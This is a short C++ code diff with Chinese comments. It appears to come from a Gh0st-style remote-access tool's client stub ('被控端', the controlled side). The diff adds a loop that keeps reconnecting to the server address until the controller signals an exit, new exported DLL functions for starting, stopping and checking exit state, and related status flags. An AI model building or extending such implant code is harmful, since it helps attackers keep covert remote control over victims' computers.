@@ -9,10 +9,15 @@
 #include "KernelManager.h"
 using namespace std;
 
+// 远程地址
 char  g_szServerIP[MAX_PATH] = {0};  
 unsigned short g_uPort = 0; 
-bool g_bExit = false;
-bool g_bThreadExit = false;
+
+// 应用程序状态（1-被控端退出 2-主控端退出）
+BOOL g_bExit = 0;
+// 工作线程状态
+BOOL g_bThreadExit = 0;
+
 HINSTANCE  g_hInstance = NULL;        
 DWORD WINAPI StartClient(LPVOID lParam);
 
@@ -60,10 +65,14 @@ int main(int argc, const char *argv[])
 	memcpy(g_szServerIP,szServerIP,strlen(szServerIP));
 	g_uPort = uPort;
 
-	HANDLE hThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)StartClient,NULL,0,NULL);
+	do{
+		g_bExit = 0;
+		HANDLE hThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)StartClient,NULL,0,NULL);
 
-	WaitForSingleObject(hThread, INFINITE);
-	CloseHandle(hThread);
+		WaitForSingleObject(hThread, INFINITE);
+		CloseHandle(hThread);
+	}while (E_RUN == status && 1 != g_bExit);
+
 	status = E_STOP;
 
 	CloseHandle(hMutex);
@@ -94,6 +103,7 @@ BOOL APIENTRY DllMain( HINSTANCE hInstance,
 // 启动运行一个ghost
 extern "C" __declspec(dllexport) void TestRun(char* szServerIP,int uPort)
 {
+	g_bExit = false;
 	memcpy(g_szServerIP,szServerIP,strlen(szServerIP));
 	g_uPort = uPort;
 
@@ -109,9 +119,11 @@ extern "C" __declspec(dllexport) void TestRun(char* szServerIP,int uPort)
 // 停止运行
 extern "C" __declspec(dllexport) void StopRun() { g_bExit = true; }
 
-
 // 是否成功停止
 extern "C" __declspec(dllexport) bool IsStoped() { return g_bThreadExit; }
+
+// 是否退出客户端
+extern "C" __declspec(dllexport) bool IsExit() { return 1 == g_bExit; }
 
 #endif
 
@@ -119,6 +131,7 @@ DWORD WINAPI StartClient(LPVOID lParam)
 {
 	IOCPClient  *ClientObject = new IOCPClient();
 
+	g_bThreadExit = false;
 	while (!g_bExit)
 	{
 		DWORD dwTickCount = GetTickCount();
